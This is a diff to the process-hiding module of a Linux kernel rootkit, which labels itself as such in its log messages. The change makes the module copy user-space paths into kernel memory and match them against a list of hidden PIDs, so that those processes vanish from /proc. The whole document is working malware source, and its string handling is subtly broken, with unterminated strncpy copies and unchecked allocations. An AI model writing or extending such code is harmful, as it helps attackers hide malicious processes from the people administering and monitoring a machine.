@@ -1,6 +1,7 @@
 #include <linux/module.h> //THIS_MODULE, also includes list.h
 #include <linux/slab.h>		// kmalloc()
 #include <linux/uaccess.h> // copy from user
+#include <linux/limits.h> // PATH_MAX
 
 #include "hiding.h"
 
@@ -136,17 +137,17 @@ int is_pid_hidden(int pid){
 	return 0;
 }
 
-const char* my_basename(const char __user* pathname){
+char* my_basename(const char* pathname){
 	// Examples: proc/ /proc proc proc/pepe /proc/
 	int len = strlen(pathname);
-	const char __user* basename = pathname;
+	const char* basename = pathname;
 	for (int i = 0; i < len-1; i++)
 		if (pathname[i] == '/')
 			basename = pathname+i+1;
 
 	len = strlen(basename);
 	char* result = kmalloc(len+1, GFP_KERNEL);
-	copy_from_user(result, basename, len+1);
+	strncpy(result, basename, len);
 	if (result[len-1] == '/') //delete / on last character
 		result[len-1] = '\x00';
 
@@ -155,20 +156,34 @@ const char* my_basename(const char __user* pathname){
 
 int pathname_includes_pid(const char __user* pathname){
     struct list_pids_node* node;
-	char pid_str[8];
-	char pid_str2[9];
-	const char* filename;
+	char pid_str[8], pid_str2[9];
+	char* filename;
+	int ret = -1;
+		
+	// Note strnlen_user returns the size of the string including the terminating NUL
+	// and the length of strncpy_from_user also includes the terminating NUL
+	int len = strnlen_user(pathname, PATH_MAX);
+	if (len > PATH_MAX){
+		log("ROOTKIT: ERROR pathname larger than PATH_MAX\n");
+		return -1;
+	}
+
+	char* my_pathname = kmalloc(len, GFP_KERNEL);
+	strncpy_from_user(my_pathname, pathname, len);
+
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
 		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
-		filename = my_basename(pathname);
-		if (strcmp(pid_str, filename) == 0 || strstr(pathname, pid_str2) != NULL){
+		filename = my_basename(my_pathname);
+		if (strcmp(pid_str, filename) == 0 || strstr(my_pathname, pid_str2) != NULL){
+			ret = node->pid;
 			kfree(filename);
-			return node->pid;
+			break;
 		}
 		kfree(filename);
 	}
-	return 0;
+	kfree(my_pathname);
+	return ret;
 }
 
 int hide_pid(int pid){
